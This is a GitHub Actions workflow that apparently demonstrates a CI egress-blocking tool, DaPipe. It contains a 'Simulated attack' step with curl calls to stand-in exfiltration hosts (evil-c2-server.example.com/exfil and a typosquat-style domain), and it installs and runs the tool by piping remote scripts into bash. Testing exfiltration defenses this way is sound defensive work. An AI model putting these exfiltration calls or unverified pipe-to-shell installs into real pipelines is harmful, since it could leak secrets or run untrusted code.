name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: DaPipe Setup
        env:
          DAPIPE_API_KEY: ${{ secrets.DAPIPE_API_KEY }}
          DAPIPE_MODE: restrict
        run: curl -sf https://app.dapipe.io/api/v1/setup | bash

      - uses: actions/setup-node@v4
        with:
          node-version: 20

      - run: npm init -y && npm install lodash express
      - run: echo "Build complete!"

      # Simulate a supply-chain attack — these should be blocked
      - name: Simulated attack
        run: |
          curl -sf --max-time 3 https://evil-c2-server.example.com/exfil 2>/dev/null || true
          curl -sf --max-time 3 https://scan.aquasecurtiy.org/steal 2>/dev/null || true

      - name: DaPipe Analyze
        if: always()
        env:
          DAPIPE_API_KEY: ${{ secrets.DAPIPE_API_KEY }}
        run: curl -sf https://app.dapipe.io/api/v1/analyze | bash
